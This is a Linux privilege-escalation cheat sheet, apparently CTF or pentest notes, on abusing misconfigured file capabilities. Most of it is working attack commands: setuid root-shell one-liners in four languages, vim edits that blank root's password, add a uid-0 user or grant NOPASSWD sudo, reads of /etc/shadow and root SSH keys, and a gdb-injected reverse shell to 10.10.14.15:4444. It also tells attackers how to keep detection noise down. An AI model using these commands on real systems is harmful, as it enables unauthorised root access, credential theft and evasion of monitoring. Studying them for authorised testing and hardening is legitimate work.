## Linux Capabilities

Linux capabilities split the monolithic root privilege into individual discrete units that can be assigned to specific binaries.  Rather than granting a binary full root access, an administrator can grant only the specific privilege it needs, such as binding to a low port or reading raw network packets. When misconfigured, these capabilities allow privilege escalation just as effectively as a SUID bit. 

***

## Enumeration

```bash
# Check capabilities on common binary paths
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

# Recursive search across the entire filesystem (faster, recommended)
getcap -r / 2>/dev/null
```

Example output:

```
/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/python3.8 cap_setuid=ep
/usr/bin/perl cap_setuid+ep
```

Any entry involving `cap_setuid`, `cap_setgid`, `cap_dac_override`, `cap_dac_read_search`, or `cap_sys_admin` should be prioritised immediately. 

***

## Capability Values Reference

| Value | Meaning |
|---|---|
| `=` | Clear capability, grant nothing |
| `+ep` | Effective and permitted: binary can use the capability immediately |
| `+ei` | Effective and inheritable: child processes inherit it |
| `+p` | Permitted only: capability is available but not yet active |

`=eip` (seen in findings) means effective, inheritable, and permitted — the broadest assignment.

***

## Dangerous Capabilities Reference

| Capability | What It Allows | Escalation Risk |
|---|---|---|
| `cap_setuid` | Set process UID to any value including 0 | Direct root via scripting language |
| `cap_setgid` | Set process GID to any value including 0 | Root group access |
| `cap_dac_override` | Bypass all file read, write, execute permission checks | Write to `/etc/passwd`, `/etc/shadow`, sudoers |
| `cap_dac_read_search` | Bypass file and directory read/execute checks | Read `/etc/shadow`, SSH keys |
| `cap_chown` | Change ownership of any file | Take ownership of `/etc/passwd` then modify it |
| `cap_fowner` | Change permissions on any file | `chmod 777 /etc/shadow` |
| `cap_sys_admin` | Broad administrative privileges including mount | Near-root, mount arbitrary filesystems |
| `cap_sys_ptrace` | Attach to and debug any process | Inject shellcode into a root process |
| `cap_sys_module` | Load and unload kernel modules | Load malicious kernel module |

***

## Attack Vector 1: cap_setuid

The most common capability finding in CTFs and real assessments. A scripting language with `cap_setuid` can call `setuid(0)` to set its own UID to root before spawning a shell. 

```bash
# Python
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# Ruby
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# Node.js
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio:[0,1,2]})'
```

Check [GTFOBins](https://gtfobins.github.io) under the Capabilities filter for the specific binary found.

***

## Attack Vector 2: cap_dac_override

This capability bypasses all file permission checks for reads, writes, and execution.  Any binary carrying it can read and write any file on the system regardless of ownership or permissions.

### Method 1: Remove Root Password via vim

```bash
# Verify the capability is present
getcap /usr/bin/vim.basic
# /usr/bin/vim.basic cap_dac_override=eip

# Open /etc/passwd directly (no sudo needed)
/usr/bin/vim.basic /etc/passwd
```

Inside vim, use a substitution to remove the root password field:

```
:%s/^root:[^:]*:/root::/
:wq!
```

Or non-interactively:

```bash
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd

# Verify the change
head -n1 /etc/passwd
# root::0:0:root:/root:/bin/bash

# Log in as root with no password
su root
```

### Method 2: Write a New Root User

```bash
# Generate a password hash
openssl passwd -1 password123
# $1$xyz$hashstring

# Append a new root-equivalent user
echo 'hacker:$1$xyz$hashstring:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

### Method 3: Add to Sudoers

```bash
echo 'currentuser ALL=(ALL) NOPASSWD: ALL' | /usr/bin/vim.basic -es /etc/sudoers
sudo su
```

***

## Attack Vector 3: cap_dac_read_search

This capability only allows reads, not writes, but reading `/etc/shadow` and SSH private keys is often sufficient to crack passwords offline or gain access to other systems. 

```bash
# If python has cap_dac_read_search
python3 -c 'print(open("/etc/shadow").read())'
python3 -c 'print(open("/root/.ssh/id_rsa").read())'
```

***

## Attack Vector 4: cap_chown / cap_fowner

These allow taking ownership or changing permissions of any file: 

```bash
# cap_chown: take ownership of /etc/shadow
python3 -c 'import os; os.chown("/etc/shadow", 1000, 1000)'
# Now read it with your regular user

# cap_fowner: make /etc/shadow world-readable
python3 -c 'import os; os.chmod("/etc/shadow", 0o777)'
cat /etc/shadow
```

***

## Attack Vector 5: cap_sys_ptrace

With ptrace capability against a running root process, you can inject shellcode directly into its memory:

```bash
# Find a root process to attach to
ps aux | grep root

# Use a ptrace injection tool or gdb
gdb -p <root_PID>
(gdb) call system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.15/4444 0>&1'")
```

***

## Detection and Hardening Perspective

Elastic and other SIEMs specifically monitor for processes with `CAP_DAC_*` capabilities accessing sensitive files like `/etc/passwd`, `/etc/shadow`, and `/root/.ssh/`.  From an attacker's standpoint, avoid unnecessary reads of these files during capability enumeration until you are ready to act, to minimise detection noise. From a defender's standpoint, capabilities should follow least privilege: use `+p` (permitted only) rather than `+ep` where possible, and never assign scripting language interpreters `cap_setuid` or `cap_setgid`. 
